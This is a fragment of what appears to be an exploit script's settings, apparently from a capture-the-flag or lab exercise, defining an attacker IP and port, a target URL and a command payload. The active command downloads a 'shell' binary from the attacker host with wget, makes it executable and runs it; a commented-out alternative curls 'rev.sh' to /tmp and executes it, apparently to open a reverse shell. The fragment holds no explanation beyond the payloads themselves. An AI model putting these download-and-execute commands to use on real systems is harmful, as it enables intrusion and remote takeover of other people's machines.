...
HOST_ADDR = '10.8.253.221'
HOST_PORT = 8888
URL = 'http://10.10.69.178:31111'
# CMD = 'curl 10.8.253.221/rev.sh -o /tmp/revv.sh ; chmod 777 /tmp/revv.sh; /tmp/revv.sh ;curl 10.8.253.221'
CMD = 'wget http://10.8.253.221/shell && chmod 777 shell && ./shell'
# CMD = './shell'
